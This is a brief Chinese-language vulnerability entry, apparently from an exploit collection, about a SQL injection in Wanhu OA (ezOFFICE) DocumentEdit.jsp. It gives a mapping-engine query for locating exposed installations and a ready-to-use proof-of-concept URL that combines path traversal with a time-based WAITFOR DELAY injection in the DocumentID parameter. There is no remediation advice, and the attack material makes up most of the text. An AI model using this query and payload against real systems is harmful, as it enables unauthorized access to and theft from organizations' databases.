# 万户OA DocumentEdit.jsp SQL注入漏洞

## 漏洞描述

万户OA DocumentEdit.jsp文件存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![](images/202209131047757.png)

验证POC

```
/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--
```

![1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a](images/202209131047397.png)

![](images/202209131047713.png)